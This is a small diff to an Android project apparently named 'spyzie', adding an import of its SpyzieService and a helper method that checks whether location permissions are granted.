@@ -15,6 +15,7 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.tantd.spyzie.R;
+import com.tantd.spyzie.service.SpyzieService;
 
 import java.io.IOException;
 import java.io.InputStream;
@@ -85,6 +86,11 @@ public final class CommonUtils {
 
     public static String getTimeStamp() {
         return new SimpleDateFormat(Constants.TIMESTAMP_FORMAT, Locale.US).format(new Date());
+    }
+
+    public static boolean hasLocationPermissions(Context context) {
+        return CommonUtils.hasPermissions(context, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION
+                , Manifest.permission.ACCESS_FINE_LOCATION});
     }
 
     public static boolean hasPermissions(Context context, String[] permissions) {
